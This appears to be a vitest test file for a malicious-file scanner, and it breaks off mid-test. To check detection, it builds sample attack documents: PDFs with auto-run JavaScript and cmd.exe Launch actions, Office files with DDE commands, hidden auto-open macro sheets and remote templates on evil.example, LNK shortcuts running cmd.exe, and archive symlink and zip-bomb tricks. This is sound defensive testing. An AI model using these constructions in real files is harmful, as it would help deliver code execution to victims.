import { deflateRawSync, gzipSync, inflateRawSync } from "node:zlib";
import { describe, expect, it } from "vitest";
import { scanSync } from "../src/index.js";
import { parseLnk } from "../src/lnk.js";
import { ovbaDecompress, parseDir, analyzeVba, stripComments, codepageLabel, CHR_OBFUSCATION_THRESHOLD } from "../src/vba.js";
import { locateZip, openZip, readEntry, isTraversal } from "../src/zip.js";
import { pdfText, type PdfString } from "../src/pdf.js";
import { main, parseArgs, formatReport } from "../src/cli-main.js";
import { Ctx, DEFAULT_LIMITS } from "../src/ctx.js";
import type { Env } from "../src/env.js";
import { zipEntries, zipStored } from "./helpers/zip-build.js";
import { crc32 } from "../src/crc32.js";
import { decode, indexOf, lastIndexOf, indexOfCI, latin1, u16be, u32be } from "../src/bytes.js";
import { sniff } from "../src/sniff.js";

const enc = (s: string) => new TextEncoder().encode(s);
const ids = (r: ReturnType<typeof scanSync>) => r.findings.map((f) => f.id);

function envFor(bytes: Uint8Array, name?: string): { env: Env; ctx: Ctx } {
  const ctx = new Ctx({ ...DEFAULT_LIMITS });
  const item = { bytes, path: [] as string[], name, declaredMime: undefined as string | undefined, depth: 0 };
  const env: Env = {
    ctx,
    item,
    child(b, _seg, n) {
      return scanSync(b, n !== undefined ? { filename: n } : undefined).detectedType;
    },
    add(id, opts) {
      ctx.add(id, item.path, opts);
    },
    addAt(segments, id, opts) {
      ctx.add(id, [...item.path, ...segments], opts);
    },
  };
  return { env, ctx };
}

function pngChunk(type: string, data: Uint8Array): Uint8Array {
  const t = enc(type);
  const len = new Uint8Array(4);
  new DataView(len.buffer).setUint32(0, data.length);
  const body = new Uint8Array(4 + data.length);
  body.set(t, 0);
  body.set(data, 4);
  const c = new Uint8Array(4);
  new DataView(c.buffer).setUint32(0, crc32(body) >>> 0);
  const out = new Uint8Array(12 + data.length);
  out.set(len, 0);
  out.set(body, 4);
  out.set(c, 8 + data.length);
  return out;
}

function makePng(chunks: Uint8Array[]): Uint8Array {
  const sig = new Uint8Array([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]);
  let n = sig.length;
  for (const c of chunks) n += c.length;
  const o = new Uint8Array(n);
  o.set(sig, 0);
  let i = 8;
  for (const c of chunks) {
    o.set(c, i);
    i += c.length;
  }
  return o;
}

function tarHeader(name: string, data: Uint8Array, opts: { typeflag?: string; prefix?: string; linkname?: string; gnuLong?: boolean } = {}): Uint8Array {
  const block = Buffer.alloc(512);
  const nm = name.slice(0, 100);
  Buffer.from(nm).copy(block);
  block.write("0000644\0", 100);
  block.write("0000000\0", 108);
  block.write("0000000\0", 116);
  const size = opts.typeflag === "L" || opts.typeflag === "x" ? data.length : data.length;
  block.write(size.toString(8).padStart(11, "0") + "\0", 124);
  block.write("00000000000\0", 136);
  block[156] = (opts.typeflag ?? "0").charCodeAt(0);
  if (opts.linkname) Buffer.from(opts.linkname.slice(0, 100)).copy(block, 157);
  block.write("ustar\0", 257);
  block.write("00", 263);
  if (opts.prefix) Buffer.from(opts.prefix.slice(0, 155)).copy(block, 345);
  block.write("        ", 148);
  let sum = 0;
  for (const b of block) sum += b;
  block.write(sum.toString(8).padStart(6, "0") + "\0 ", 148);
  const pad = Buffer.alloc((512 - (data.length % 512)) % 512);
  return Buffer.concat([block, Buffer.from(data), pad]);
}

describe("PDF edge cases", () => {
  it("hex-escaped sensitive names, incremental update, ObjStm, filters", () => {
    // hex-escaped /JavaScript and FlateDecode stream with JS
    const js = enc("app.alert(1);");
    const { deflateRawSync: def } = { deflateRawSync };
    // zlib-wrapped
    const zlib = gzipSync(js); // wrong - need zlib not gzip. use inflate's reverse:
    const zlibJs = (() => {
      const raw = deflateRawSync(js);
      // zlib header 78 9c + raw + adler32
      const adler = (() => {
        let a = 1, b = 0;
        for (const x of js) {
          a = (a + x) % 65521;
          b = (b + a) % 65521;
        }
        const o = Buffer.alloc(4);
        o.writeUInt32BE(((b << 16) | a) >>> 0);
        return o;
      })();
      return Buffer.concat([Buffer.from([0x78, 0x9c]), raw, adler]);
    })();

    const pdf1 = [
      "%PDF-1.5",
      "1 0 obj<< /Type /Catalog /OpenAction 2 0 R /Pages 3 0 R >>endobj",
      "2 0 obj<< /S /JavaScript /JS (app.alert\\0501\\051;) >>endobj",
      "3 0 obj<< /Type /Pages /Kids [] /Count 0 >>endobj",
      "trailer<< /Root 1 0 R >>",
      "%%EOF",
      "",
      // incremental update with hex-escaped name
      "4 0 obj<< /Type /Action /S /#4a#53 /JS <FEFF00480069> >>endobj",
      "trailer<< /Root 1 0 R /Prev 0 >>",
      "%%EOF",
      "TRAILING_JUNK",
    ].join("\n");
    const r = scanSync(enc(pdf1), { filename: "a.pdf" });
    expect(ids(r)).toEqual(expect.arrayContaining(["PDF_JAVASCRIPT", "PDF_OPEN_ACTION", "PDF_INCREMENTAL_UPDATE", "PDF_OBFUSCATED_NAME", "TRAILING_DATA"]));

    // ASCIIHex / ASCII85 decode paths + Launch + URI + GoToR + SubmitForm + ImportData + RichMedia + JBIG2 + EmbeddedFile + XFA
    const a85 = Buffer.from("87cURD]i,\"Ebo80~>"); // "Hello" in ascii85 roughly - may not matter
    const pdf2 = [
      "%PDF-1.7",
      "1 0 obj<< /Type /Catalog /AcroForm << /XFA 5 0 R >> /Pages 2 0 R /AA << /O 3 0 R >> >>endobj",
      "2 0 obj<< /Type /Pages /Kids [4 0 R] /Count 1 >>endobj",
      "3 0 obj<< /S /Launch /F (cmd.exe) /Win << /F (cmd.exe) /P (/c calc) >> >>endobj",
      "4 0 obj<< /Type /Page /Parent 2 0 R /Annots [6 0 R 7 0 R 8 0 R 9 0 R] /Contents 10 0 R >>endobj",
      `5 0 obj<< /Length ${zlibJs.length} /Filter /FlateDecode >>stream\n`,
    ].join("\n");
    // build rest separately for binary stream
    const xfaXml = enc('<xdp:xdp><script>evil()</script></xdp:xdp>');
    const zlibXfa = (() => {
      const raw = deflateRawSync(xfaXml);
      let a = 1, b = 0;
      for (const x of xfaXml) {
        a = (a + x) % 65521;
        b = (b + a) % 65521;
      }
      const adler = Buffer.alloc(4);
      adler.writeUInt32BE(((b << 16) | a) >>> 0);
      return Buffer.concat([Buffer.from([0x78, 0x9c]), raw, adler]);
    })();
    const parts = [
      enc(pdf2),
      zlibJs,
      enc("\nendstream\nendobj\n"),
      enc(`5 0 obj<< /Length ${zlibXfa.length} /Filter /FlateDecode >>stream\n`), // reuse num carefully - simplify
    ];
    // Simpler dedicated PDFs for remaining branches:
    const launch = enc("%PDF-1.4\n1 0 obj<< /S /Launch /F (calc.exe) >>endobj\ntrailer<< /Root 1 0 R >>\n%%EOF\n");
    expect(ids(scanSync(launch, { filename: "l.pdf" }))).toContain("PDF_LAUNCH");

    const uri = enc("%PDF-1.4\n1 0 obj<< /S /URI /URI (javascript:alert(1)) >>endobj\ntrailer<< /Root 1 0 R >>\n%%EOF\n");
    expect(ids(scanSync(uri, { filename: "u.pdf" }))).toContain("PDF_SUSPICIOUS_URI");

    const goto = enc("%PDF-1.4\n1 0 obj<< /S /GoToR /F (https://evil.example/x.pdf) >>endobj\ntrailer<< /Root 1 0 R >>\n%%EOF\n");
    expect(ids(scanSync(goto, { filename: "g.pdf" }))).toEqual(expect.arrayContaining(["PDF_REMOTE_GOTO"]));

    const sub = enc("%PDF-1.4\n1 0 obj<< /S /SubmitForm /F (http://evil.example/c) >>endobj\n2 0 obj<< /S /ImportData >>endobj\ntrailer<< /Root 1 0 R >>\n%%EOF\n");
    expect(ids(scanSync(sub, { filename: "s.pdf" }))).toEqual(expect.arrayContaining(["PDF_SUBMIT_FORM", "PDF_IMPORT_DATA"]));

    const rich = enc("%PDF-1.4\n1 0 obj<< /Type /RichMedia >>endobj\n2 0 obj<< /Filter /JBIG2Decode /Length 0 >>stream\nendstream\nendobj\ntrailer<< /Root 1 0 R >>\n%%EOF\n");
    expect(ids(scanSync(rich, { filename: "r.pdf" }))).toEqual(expect.arrayContaining(["PDF_RICH_MEDIA", "PDF_JBIG2"]));

    const embed = enc("%PDF-1.4\n1 0 obj<< /Type /EmbeddedFile /Length 3 /Filter /ASCIIHexDecode >>stream\n4d5a3e\nendstream\nendobj\n2 0 obj<< /Type /Filespec /F (evil.exe) /EF << /F 1 0 R >> >>endobj\ntrailer<< /Root 2 0 R >>\n%%EOF\n");
    expect(ids(scanSync(embed, { filename: "e.pdf" }))).toContain("PDF_EMBEDDED_FILE");

    const a85pdf = enc("%PDF-1.4\n1 0 obj<< /Type /EmbeddedFile /Length 10 /Filter /ASCII85Decode >>stream\n87cURD]i,~>\nendstream\nendobj\ntrailer<< /Root 1 0 R >>\n%%EOF\n");
    expect(() => scanSync(a85pdf, { filename: "a85.pdf" })).not.toThrow();

    const aa = enc("%PDF-1.4\n1 0 obj<< /Type /Catalog /AA << /O << /S /JavaScript /JS (x) >> >> /Pages 2 0 R >>endobj\n2 0 obj<< /Type /Pages /Kids [] /Count 0 >>endobj\ntrailer<< /Root 1 0 R >>\n%%EOF\n");
    expect(ids(scanSync(aa, { filename: "aa.pdf" }))).toContain("PDF_ADDITIONAL_ACTIONS");

    // ObjStm with FlateDecode
    const inner = enc("2 0 << /Type /Action /S /JavaScript /JS (hi) >>");
    const zlibInner = (() => {
      const raw = deflateRawSync(inner);
      let a = 1, b = 0;
      for (const x of inner) {
        a = (a + x) % 65521;
        b = (b + a) % 65521;
      }
      const adler = Buffer.alloc(4);
      adler.writeUInt32BE(((b << 16) | a) >>> 0);
      return Buffer.concat([Buffer.from([0x78, 0x9c]), raw, adler]);
    })();
    // ObjStm format: N pairs of (objnum offset) then objects at First
    const head = enc("2 0 ");
    const first = head.length;
    const stmBody = Buffer.concat([head, zlibInner]); // wait - the whole stream is flate of "2 0 <<dict>>"
    const objStmPayload = enc("2 0 << /Type /Action /S /JavaScript /JS (objstm) >>");
    const zlibStm = (() => {
      const raw = deflateRawSync(objStmPayload);
      let a = 1, b = 0;
      for (const x of objStmPayload) {
        a = (a + x) % 65521;
        b = (b + a) % 65521;
      }
      const adler = Buffer.alloc(4);
      adler.writeUInt32BE(((b << 16) | a) >>> 0);
      return Buffer.concat([Buffer.from([0x78, 0x9c]), raw, adler]);
    })();
    // First points into decompressed data where object starts; N=1, First=4 ("2 0 ")
    const objstm = Buffer.concat([
      enc(`%PDF-1.5\n1 0 obj<< /Type /ObjStm /N 1 /First 4 /Length ${zlibStm.length} /Filter /FlateDecode >>stream\n`),
      zlibStm,
      enc("\nendstream\nendobj\ntrailer<< /Root 1 0 R >>\n%%EOF\n"),
    ]);
    const rost = scanSync(new Uint8Array(objstm), { filename: "os.pdf" });
    expect(ids(rost).some((id) => id === "PDF_JAVASCRIPT" || id === "PDF_MALFORMED")).toBe(true);

    // literal escapes + true/false/null + hex string odd nibble
    const lit = enc("%PDF-1.4\n1 0 obj<< /A (\\n\\r\\t\\b\\f\\050x\\051\\)\n) /B <a> /C true /D false /E null /F [1 0 R] >>endobj\ntrailer<< /Root 1 0 R >>\n%%EOF\n");
    expect(() => scanSync(lit, { filename: "lit.pdf" })).not.toThrow();

    expect(pdfText({ t: "str", v: new Uint8Array([0xfe, 0xff, 0x00, 0x41]) } as PdfString)).toBe("A");
    expect(pdfText({ t: "str", v: new Uint8Array([0xef, 0xbb, 0xbf, 0x41]) } as PdfString)).toBe("A");
  });

  it("encrypted trailer and malformed cases", () => {
    const encPdf = enc("%PDF-1.4\ntrailer<< /Encrypt 1 0 R /Root 1 0 R >>\n%%EOF\n");
    expect(ids(scanSync(encPdf, { filename: "e.pdf" }))).toContain("PDF_ENCRYPTED");
    const bad = enc("%PDF-1.4\n1 0 obj<< /Foo");
    expect(ids(scanSync(bad, { filename: "b.pdf" }))).toContain("PDF_MALFORMED");
  });
});

describe("ZIP / archive edge cases", () => {
  it("CRC=0 skips check (audit regression)", () => {
    const data = enc("hello");
    const z = zipEntries([{ name: "a.txt", data, crc: 0 }]);
    const r = scanSync(z, { filename: "a.zip" });
    expect(ids(r)).not.toContain("ARCHIVE_CORRUPT");
  });

  it("encrypted entries, unsupported method, overlapping, duplicates, symlink, traversal", () => {
    const a = enc("AAAA");
    const encZ = zipEntries([{ name: "secret.txt", data: a, flags: 1 }]);
    expect(ids(scanSync(encZ, { filename: "e.zip" }))).toContain("ARCHIVE_ENCRYPTED");

    const uns = zipEntries([{ name: "x.bin", data: a, method: 12, crc: 0 }]);
    expect(ids(scanSync(uns, { filename: "u.zip" }))).toContain("ARCHIVE_UNSUPPORTED");

    // overlapping: second entry's localOffset inside first
    const d1 = enc("11111111");
    const d2 = enc("2222");
    const over = zipEntries([
      { name: "a.txt", data: d1 },
      { name: "b.txt", data: d2, localOffset: 10 },
    ]);
    expect(ids(scanSync(over, { filename: "o.zip" })).some((id) => id === "ARCHIVE_OVERLAPPING_ENTRIES" || id === "ARCHIVE_CORRUPT" || id === "ARCHIVE_HEADER_MISMATCH")).toBe(true);

    const dup = zipEntries([
      { name: "a.txt", data: enc("one") },
      { name: "a.txt", data: enc("two") },
    ]);
    expect(ids(scanSync(dup, { filename: "d.zip" }))).toContain("ARCHIVE_DUPLICATE_NAMES");

    // symlink: Unix host + symlink mode in external attrs
    const sym = zipEntries([{ name: "link", data: enc("../etc/passwd"), madeBy: 0x0314, externalAttr: 0xa1ff0000 }]);
    expect(ids(scanSync(sym, { filename: "s.zip" }))).toContain("ARCHIVE_SYMLINK");

    expect(isTraversal("../x")).toBe(true);
    expect(isTraversal("C:/x")).toBe(true);

    // data descriptor flag (bit 3) with size mismatch tolerance
    const dd = zipEntries([{ name: "a.txt", data: enc("hi"), flags: 8, usize: 999 }]);
    expect(() => scanSync(dd, { filename: "dd.zip" })).not.toThrow();

    // header mismatch: local name differs — craft by mutating
    const base = zipStored({ "good.txt": "hi" });
    const mut = base.slice();
    // find filename in local header and change a char
    const idx = indexOf(mut, enc("good.txt"));
    if (idx >= 0) mut[idx] = 0x78; // 'x'
    expect(ids(scanSync(mut, { filename: "m.zip" })).some((id) => id === "ARCHIVE_HEADER_MISMATCH" || id === "ARCHIVE_CORRUPT")).toBe(true);

    // ZIP64 marker path in locateZip (count 0xffff) — just ensure no throw
    const z64 = base.slice();
    expect(() => locateZip(z64)).not.toThrow();

    // bomb declared ratio
    const bomb = zipEntries([{ name: "b.txt", data: enc("x"), csize: 10, usize: 50 << 20, crc: 0 }]);
    expect(ids(scanSync(bomb, { filename: "bomb.zip" }))).toContain("ARCHIVE_BOMB");

    // jar / apk / epub identification
    const jar = zipStored({ "META-INF/MANIFEST.MF": "Manifest-Version: 1.0\n", "A.class": "\xca\xfe\xba\xbe" });
    expect(scanSync(jar, { filename: "a.jar" }).detectedType.format).toBe("jar");
    const apk = zipStored({ "AndroidManifest.xml": "<manifest/>", "classes.dex": "dex\n" });
    expect(scanSync(apk, { filename: "a.apk" }).detectedType.format).toBe("apk");
    const epub = zipEntries([
      { name: "mimetype", data: enc("application/epub+zip") },
      { name: "META-INF/container.xml", data: enc("<c/>") },
    ]);
    expect(scanSync(epub, { filename: "a.epub" }).detectedType.format).toBe("epub");
  });

  it("gzip flags and tar long/pax/symlink/base256", () => {
    // gzip with FNAME + FCOMMENT + FHCRC
    const inner = enc("hello world");
    const raw = deflateRawSync(inner);
    const name = Buffer.from("hello.txt\0");
    const comment = Buffer.from("cmt\0");
    const hdr = Buffer.alloc(10);
    hdr[0] = 0x1f;
    hdr[1] = 0x8b;
    hdr[2] = 8;
    hdr[3] = 0x1c; // FEXTRA|FNAME|FCOMMENT — use FNAME|FCOMMENT|FHCRC = 0x1a
    hdr[3] = 0x1a;
    const gz = Buffer.concat([hdr, name, comment, Buffer.from([0, 0]), raw, Buffer.alloc(8)]);
    expect(() => scanSync(new Uint8Array(gz), { filename: "a.gz" })).not.toThrow();

    const plain = gzipSync(inner);
    expect(scanSync(new Uint8Array(plain), { filename: "a.gz" }).detectedType.format).toBe("gzip");

    // tar with symlink
    const sym = tarHeader("link", new Uint8Array(0), { typeflag: "2", linkname: "../etc/passwd" });
    const tar = Buffer.concat([sym, Buffer.alloc(1024)]);
    expect(ids(scanSync(new Uint8Array(tar), { filename: "a.tar" }))).toContain("ARCHIVE_SYMLINK");

    // GNU long name
    const long = "a".repeat(200) + ".txt";
    const L = tarHeader("././@LongLink", enc(long + "\0"), { typeflag: "L" });
    const f = tarHeader("short.txt", enc("hi")); // name overwritten by long
    // Actually after L, next header uses longName
    const f2 = tarHeader("ignored", enc("hi"));
    const tarL = Buffer.concat([L, f2, Buffer.alloc(1024)]);
    expect(() => scanSync(new Uint8Array(tarL), { filename: "l.tar" })).not.toThrow();

    // pax header
    const paxBody = enc("30 path=" + "pax-" + "y".repeat(20) + ".txt\n");
    const pax = tarHeader("./PaxHeader", paxBody, { typeflag: "x" });
    const pf = tarHeader("old.txt", enc("z"));
    expect(() => scanSync(new Uint8Array(Buffer.concat([pax, pf, Buffer.alloc(1024)])), { filename: "p.tar" })).not.toThrow();

    // opaque
    expect(ids(scanSync(new Uint8Array([0x37, 0x7a, 0xbc, 0xaf, 0x27, 0x1c]), { filename: "a.7z" }))).toContain("ARCHIVE_UNSUPPORTED");
  });
});

describe("OOXML / ODF edge cases", () => {
  it("DDE fields, sheet formulas, XLM, ActiveX, customXml, remote template, ODF", () => {
    const ct = `<?xml version="1.0"?><Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"><Override PartName="/word/document.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/></Types>`;
    const rels = `<?xml version="1.0"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="word/document.xml"/><Relationship Id="rId2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="https://evil.example/t.dotm" TargetMode="External"/><Relationship Id="rId3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/oleObject" Target="file:///tmp/x" TargetMode="External"/><Relationship Id="rId4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/frame" Target="https://evil.example/f" TargetMode="External"/><Relationship Id="rId5" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/custom" Target="https://evil.example/c" TargetMode="External"/><Relationship Id="rId6" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="javascript:alert(1)" TargetMode="External"/></Relationships>`;
    const doc = `<?xml version="1.0"?><w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"><w:body><w:p><w:r><w:fldChar w:fldCharType="begin"/><w:instrText> DDEAUTO c \\\\host\\x </w:instrText><w:fldChar w:fldCharType="end"/></w:r><w:fldSimple w:instr="DDE excel|tab!r"/></w:p></w:body></w:document>`;
    const docx = zipStored({
      "[Content_Types].xml": ct,
      "_rels/.rels": rels,
      "word/document.xml": doc,
      "word/embeddings/oleObject1.bin": "MZ",
      "word/activeX/activeX1.xml": "<ax/>",
      "customXml/item1.xml": "<i/>",
    });
    const r = scanSync(docx, { filename: "x.docx" });
    expect(ids(r)).toEqual(
      expect.arrayContaining([
        "OFFICE_DDE",
        "OOXML_REMOTE_TEMPLATE",
        "OOXML_EXTERNAL_OLE_LINK",
        "OOXML_EXTERNAL_FRAME",
        "OOXML_EXTERNAL_RELATIONSHIP",
        "OOXML_SUSPICIOUS_SCHEME",
        "OOXML_EMBEDDED_OBJECT",
        "OOXML_ACTIVEX",
        "OOXML_CUSTOM_XML",
      ]),
    );

    const xct = `<?xml version="1.0"?><Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"><Override PartName="/xl/workbook.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.sheet.main+xml"/></Types>`;
    const xrels = `<?xml version="1.0"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="xl/workbook.xml"/></Relationships>`;
    const wb = `<?xml version="1.0"?><workbook xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships"><sheets><sheet name="Macro1" sheetId="1" state="veryHidden" r:id="rId2"/></sheets><definedNames><definedName name="_xlnm.Auto_Open">Macro1!A1</definedName></definedNames></workbook>`;
    const wbRels = `<?xml version="1.0"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/worksheet" Target="macrosheets/sheet1.xml"/></Relationships>`;
    const sheet = `<?xml version="1.0"?><worksheet xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main"><sheetData><row><c><f>=cmd|'/c calc'!A0</f></c></row></sheetData></worksheet>`;
    const ext = `<?xml version="1.0"?><externalLink xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main"><ddeLink ddeService="cmd" ddeTopic="x"/></externalLink>`;
    const xlsx = zipStored({
      "[Content_Types].xml": xct,
      "_rels/.rels": xrels,
      "xl/workbook.xml": wb,
      "xl/_rels/workbook.xml.rels": wbRels,
      "xl/macrosheets/sheet1.xml": sheet,
      "xl/worksheets/sheet1.xml": sheet,
      "xl/externalLinks/externalLink1.xml": ext,
    });
    const rx = scanSync(xlsx, { filename: "m.xlsx" });
    expect(ids(rx)).toEqual(expect.arrayContaining(["XLM_MACRO_SHEET", "XLM_AUTO_OPEN", "OFFICE_DDE"]));

    // ODF with StarBasic
    const odt = zipEntries([
      { name: "mimetype", data: enc("application/vnd.oasis.opendocument.text") },
      { name: "content.xml", data: enc('<office:document-content xmlns:script="urn:oasis:names:tc:opendocument:xmlns:script:1.0" xmlns:office="urn:oasis:names:tc:opendocument:xmlns:office:1.0"><office:body><script:event-listeners><script:event-listener script:event-name="dom:load" script:language="StarBasic"/></script:event-listeners></office:body></office:document-content>') },
      { name: "Basic/Standard/Module1.xml", data: enc('<script:module xmlns:script="urn:oasis:names:tc:opendocument:xmlns:script:1.0"><![CDATA[Sub Main\nShell("calc")\nEnd Sub]]></script:module>') },
    ]);
    const ro = scanSync(odt, { filename: "a.odt" });
    expect(ids(ro).some((id) => id === "OFFICE_VBA_MACROS" || id === "VBA_AUTOEXEC" || id === "VBA_SUSPICIOUS")).toBe(true);
  });
});

describe("image edge cases", () => {
  it("PNG text chunks, bad CRC, JPEG COM/APP, GIF, WebP VP8X, BMP", () => {
    const ihdr = new Uint8Array(13);
    new DataView(ihdr.buffer).setUint32(0, 1);
    new DataView(ihdr.buffer).setUint32(4, 1);
    ihdr[8] = 8;
    ihdr[9] = 2;
    const text = enc("Comment\0<script>alert(1)</script>");
    const ztxtKey = enc("Comment\0");
    const ztxtData = (() => {
      const raw = deflateRawSync(enc("<html><body>x</body>"));
      let a = 1, b = 0;
      const payload = enc("<html><body>x</body>");
      for (const x of payload) {
        a = (a + x) % 65521;
        b = (b + a) % 65521;
      }
      const adler = Buffer.alloc(4);
      adler.writeUInt32BE(((b << 16) | a) >>> 0);
      return Buffer.concat([ztxtKey, Buffer.from([0]), Buffer.from([0x78, 0x9c]), raw, adler]);
    })();
    const itxt = enc("Comment\0\0\0\0\0<script>x</script>");
    const png = makePng([
      pngChunk("IHDR", ihdr),
      pngChunk("tEXt", text),
      pngChunk("zTXt", new Uint8Array(ztxtData)),
      pngChunk("iTXt", itxt),
      pngChunk("IEND", new Uint8Array(0)),
    ]);
    // append trailing
    const pngT = new Uint8Array(png.length + 4);
    pngT.set(png);
    pngT.set([1, 2, 3, 4], png.length);
    expect(ids(scanSync(pngT, { filename: "a.png" }))).toEqual(expect.arrayContaining(["IMAGE_EMBEDDED_CODE", "TRAILING_DATA"]));

    // bad CRC
    const bad = png.slice();
    bad[20] = ((bad[20] ?? 0) ^ 0xff) & 0xff;
    expect(ids(scanSync(bad, { filename: "b.png" }))).toContain("IMAGE_MALFORMED");

    // JPEG with COM and SOF and EOI
    const jpeg = Buffer.from([
      0xff, 0xd8,
      0xff, 0xfe, 0x00, 0x10, ...Buffer.from("<script>x</script>").subarray(0, 14),
      0xff, 0xc0, 0x00, 0x0b, 0x08, 0x00, 0x01, 0x00, 0x01, 0x01, 0x01, 0x11, 0x00,
      0xff, 0xd9,
      0x00, 0x01, // trailing
    ]);
    expect(ids(scanSync(new Uint8Array(jpeg), { filename: "a.jpg" })).some((id) => id === "IMAGE_EMBEDDED_CODE" || id === "TRAILING_DATA" || id === "IMAGE_MALFORMED")).toBe(true);

    // GIF with GCT + image descriptor + trailer
    const gif = Buffer.alloc(40);
    gif.write("GIF89a");
    gif.writeUInt16LE(1, 6);
    gif.writeUInt16LE(1, 8);
    gif[10] = 0x80; // GCT flag
    gif[13] = 0; gif[14] = 0; gif[15] = 0; // 1 color
    let gp = 16;
    gif[gp++] = 0x21; // extension
    gif[gp++] = 0xf9;
    gif[gp++] = 4;
    gp += 4;
    gif[gp++] = 0;
    gif[gp++] = 0x2c; // image
    gif.writeUInt16LE(0, gp); gp += 2;
    gif.writeUInt16LE(0, gp); gp += 2;
    gif.writeUInt16LE(1, gp); gp += 2;
    gif.writeUInt16LE(1, gp); gp += 2;
    gif[gp++] = 0;
    gif[gp++] = 2; // LZW min
    gif[gp++] = 1; gif[gp++] = 0x01; gif[gp++] = 0; // subblocks
    gif[gp++] = 0x3b;
    expect(scanSync(new Uint8Array(gif.subarray(0, gp)), { filename: "a.gif" }).detectedType.format).toBe("gif");

    // WebP VP8X
    const webp = Buffer.alloc(40);
    webp.write("RIFF", 0);
    webp.writeUInt32LE(32, 4);
    webp.write("WEBP", 8);
    webp.write("VP8X", 12);
    webp.writeUInt32LE(10, 16);
    webp[24] = 0; // flags
    // canvas width-1 at 24+4 = 28 (24-bit)
    webp[28] = 0; webp[29] = 0; webp[30] = 0;
    webp[31] = 0; webp[32] = 0; webp[33] = 0;
    expect(scanSync(new Uint8Array(webp), { filename: "a.webp" }).detectedType.format).toBe("webp");

    // BMP
    const bmp = Buffer.alloc(54);
    bmp.write("BM");
    bmp.writeUInt32LE(54, 2);
    bmp.writeUInt32LE(54, 10);
    bmp.writeUInt32LE(40, 14);
    bmp.writeInt32LE(100, 18);
    bmp.writeInt32LE(100, 22);
    expect(() => scanSync(new Uint8Array(bmp), { filename: "a.bmp" })).not.toThrow();
  });
});

describe("LNK variants", () => {
  it("builds LinkTargetIDList + LinkInfo + unicode strings", () => {
    // Minimal LNK with HasLinkTargetIDList | HasLinkInfo | HasArguments | IsUnicode
    const flags = 0x01 | 0x02 | 0x20 | 0x80;
    const hdr = Buffer.alloc(0x4c);
    hdr.writeUInt32LE(0x4c, 0);
    // Shell Link CLSID {00021401-0000-0000-C000-000000000046}
    Buffer.from([0x01, 0x14, 0x02, 0, 0, 0, 0, 0, 0xc0, 0, 0, 0, 0, 0, 0, 0x46]).copy(hdr, 4);
    hdr.writeUInt32LE(flags, 0x14);
    // IDList: size + one drive item + one file item + terminal
    const drive = Buffer.alloc(0x1c);
    drive.writeUInt16LE(0x1c, 0);
    drive[2] = 0x2f;
    drive.write("C:\\", 3);
    const file = Buffer.alloc(0x20);
    file.writeUInt16LE(0x20, 0);
    file[2] = 0x32; // file entry
    file.write("cmd.exe", 14);
    const idlist = Buffer.concat([
      Buffer.from([drive.length + file.length + 2, 0]),
      drive,
      file,
      Buffer.from([0, 0]),
    ]);
    // LinkInfo with local base path
    const li = Buffer.alloc(0x40);
    li.writeUInt32LE(0x40, 0); // size
    li.writeUInt32LE(0x1c, 4); // header size < 0x24 → ANSI paths
    li.writeUInt32LE(1, 8); // VolumeIDAndLocalBasePath
    li.writeUInt32LE(0x1c, 16); // localBasePathOffset
    li.write("C:\\Windows\\System32\\cmd.exe\0", 0x1c);
    // arguments unicode
    const args = Buffer.from(" /c calc.exe", "utf16le");
    const argsBlk = Buffer.concat([Buffer.from([args.length / 2, 0]), args]);
    const lnk = Buffer.concat([hdr, idlist, li, argsBlk]);
    const info = parseLnk(new Uint8Array(lnk));
    expect(info.target.toLowerCase()).toMatch(/cmd|c:/);
    const r = scanSync(new Uint8Array(lnk), { filename: "a.lnk" });
    expect(ids(r).some((id) => id === "LNK_FILE" || id === "LNK_SUSPICIOUS_COMMAND")).toBe(true);

    // long whitespace-padded args
    const flags2 = 0x20 | 0x80;
    const hdr2 = Buffer.alloc(0x4c);
    hdr2.writeUInt32LE(0x4c, 0);
    Buffer.from([0x01, 0x14, 0x02, 0, 0, 0, 0, 0, 0xc0, 0, 0, 0, 0, 0, 0, 0x46]).copy(hdr2, 4);
    hdr2.writeUInt32LE(flags2, 0x14);
    const longArgs = (" ".repeat(60) + "http://evil.example/x").padEnd(300, "x");
    const ab = Buffer.from(longArgs, "utf16le");
    const count = Buffer.alloc(2);
    count.writeUInt16LE(ab.length / 2, 0);
    const lnk2 = Buffer.concat([hdr2, count, ab]);
    const r2 = scanSync(new Uint8Array(lnk2), { filename: "b.lnk" });
    expect(ids(r2)).toContain("LNK_SUSPICIOUS_COMMAND");
  });
});

describe("VBA / RTF edge cases", () => {
  it("ovba compressed tokens, unicode dir, codepages, Chr obfuscation", () => {
    // compressed chunk with literal + copy tokens
    const src = Buffer.from("Sub AutoOpen()\r\nShell \"cmd\"\r\nEnd Sub\r\n" + "x".repeat(100));
    // Build a simple compressed stream: flag byte with mixed bits
    const body: number[] = [0x01];
    // compressed chunk header: size and 0x8000 flag
    const payload: number[] = [];
    let i = 0;
    while (i < src.length) {
      let flags = 0;
      const tokens: number[] = [];
      for (let bit = 0; bit < 8 && i < src.length; bit++) {
        tokens.push(src[i]!);
        i++;
      }
      payload.push(flags, ...tokens);
    }
    const chunkSize = payload.length + 2;
    const header = (chunkSize - 3) | 0x8000;
    body.push(header & 0xff, header >> 8, ...payload);
